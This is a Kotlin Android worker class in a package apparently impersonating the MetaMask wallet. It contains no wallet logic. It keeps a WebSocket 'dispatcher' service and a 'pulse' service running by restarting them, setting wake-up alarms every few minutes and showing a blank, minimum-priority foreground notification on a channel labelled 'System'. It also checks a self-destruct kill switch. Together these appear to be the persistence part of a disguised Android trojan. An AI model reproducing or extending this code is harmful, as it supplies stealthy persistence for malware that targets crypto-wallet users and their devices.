package com.example.MetaMask.services

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import androidx.annotation.Keep
import androidx.core.app.NotificationCompat
import androidx.work.ForegroundInfo
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.MetaMask.R
import com.example.MetaMask.receivers.AlarmReceiver

@Keep
class SchedulerWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    companion object {
        private const val REPEATING_ALARM_INTERVAL_MS = 3 * 60 * 1000L
        private const val EXACT_ALARM_INTERVAL_MS = 5 * 60 * 1000L
    }

    @Suppress("DEPRECATION")
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        android.util.Log.d("XDBG", "[SchedulerWorker] isServiceRunning enter serviceClass=${serviceClass}") //xdbg
        val manager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            android.util.Log.d("XDBG", "[SchedulerWorker] loop") //xdbg
            if (serviceClass.name == service.service.className) {
                android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
                android.util.Log.d("XDBG", "[SchedulerWorker] return") //xdbg
                return true
            }
        }
        android.util.Log.d("XDBG", "[SchedulerWorker] return") //xdbg
        return false
    }

    override fun doWork(): Result {
        android.util.Log.d("XDBG", "[SchedulerWorker] doWork enter") //xdbg
        try {
            if (Build.VERSION.SDK_INT >= 31) {
                android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
                setForegroundAsync(createForegroundInfo()).get()
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SchedulerWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            android.util.Log.d("XDBG", "[SchedulerWorker] return") //xdbg
            return Result.failure()
        }

        val killSwitchPrefs = applicationContext.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
            WorkManager.getInstance(applicationContext).cancelAllWork()
            android.util.Log.d("XDBG", "[SchedulerWorker] return") //xdbg
            return Result.success()
        }

        val masterRunning = isServiceRunning(MasterWebSocketDispatcher::class.java)
        android.util.Log.d("XDBG", "[SchedulerWorker] return") //xdbg
        return try {
            startMasterService()
            scheduleRepeatingAlarm()
            scheduleExactAlarm()
            Result.success()
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SchedulerWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            Result.retry()
        }
    }

    private fun createForegroundInfo(): ForegroundInfo {
        android.util.Log.d("XDBG", "[SchedulerWorker] createForegroundInfo enter") //xdbg
        val channelId = "worker_channel"
        val notificationId = 2001

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
            val channel = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
            val manager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(applicationContext, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        android.util.Log.d("XDBG", "[SchedulerWorker] return") //xdbg
        return if (Build.VERSION.SDK_INT >= 34) {
            ForegroundInfo(notificationId, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else if (Build.VERSION.SDK_INT >= 29) {
            ForegroundInfo(notificationId, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            ForegroundInfo(notificationId, notification)
        }
    }

    private fun startMasterService() {
        android.util.Log.d("XDBG", "[SchedulerWorker] startMasterService enter") //xdbg
        if (!isServiceRunning(MasterWebSocketDispatcher::class.java)) {
            android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
            try {
                val pulseIntent = Intent(applicationContext, com.example.MetaMask.services.PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
                    applicationContext.startForegroundService(pulseIntent)
                } else {
                    applicationContext.startService(pulseIntent)
                }
            } catch (_: Exception) {}
        }

        val serviceIntent = Intent(applicationContext, MasterWebSocketDispatcher::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
            try {
                applicationContext.startForegroundService(serviceIntent)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[SchedulerWorker] catch (ignored)") //xdbg
                try {
                    applicationContext.startService(serviceIntent)
                } catch (_: Exception) {}
            }
        } else {
            applicationContext.startService(serviceIntent)
        }
    }

    private fun scheduleRepeatingAlarm() {
        android.util.Log.d("XDBG", "[SchedulerWorker] scheduleRepeatingAlarm enter") //xdbg
        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(applicationContext, AlarmReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            applicationContext,
            1001,
            intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        alarmManager.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + REPEATING_ALARM_INTERVAL_MS,
            REPEATING_ALARM_INTERVAL_MS,
            pendingIntent
        )
    }

    private fun scheduleExactAlarm() {
        android.util.Log.d("XDBG", "[SchedulerWorker] scheduleExactAlarm enter") //xdbg
        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(applicationContext, AlarmReceiver::class.java)

        val pendingIntent = PendingIntent.getBroadcast(
            applicationContext,
            1002,
            intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
            android.util.Log.d("XDBG", "[SchedulerWorker] if branch") //xdbg
            return
        }
        alarmManager.setExactAndAllowWhileIdle(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + EXACT_ALARM_INTERVAL_MS,
            pendingIntent
        )
    }
}
